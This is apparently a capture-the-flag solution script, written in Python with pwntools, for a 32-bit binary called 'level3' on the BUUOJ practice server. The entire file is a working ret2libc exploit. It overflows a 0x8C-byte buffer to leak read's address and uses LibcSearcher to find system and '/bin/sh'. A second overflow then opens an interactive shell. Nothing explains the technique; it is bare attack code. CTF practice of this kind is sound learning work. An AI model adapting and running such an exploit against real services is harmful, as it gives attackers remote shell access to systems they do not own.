from pwn import *
from LibcSearcher import *

context.arch = 'i386'
elf = ELF("./level3")
r = remote("node3.buuoj.cn", 26832)
r.recvline()
r.send('a' * 0x8C + flat([0x8048340, 0x804844B, 1, 0x804a00c, 4]))
read_addr = u32(r.recv(4))
libc = LibcSearcher("read", read_addr)
libc_base = read_addr - libc.dump("read")
system_addr = libc_base + libc.dump("system")
exit_addr = libc_base + libc.dump('exit')
bin_sh_addr = libc_base + libc.dump("str_bin_sh")
r.recvline()
r.send('a' * 0x8C + flat([system_addr, exit_addr, bin_sh_addr]))
r.interactive()
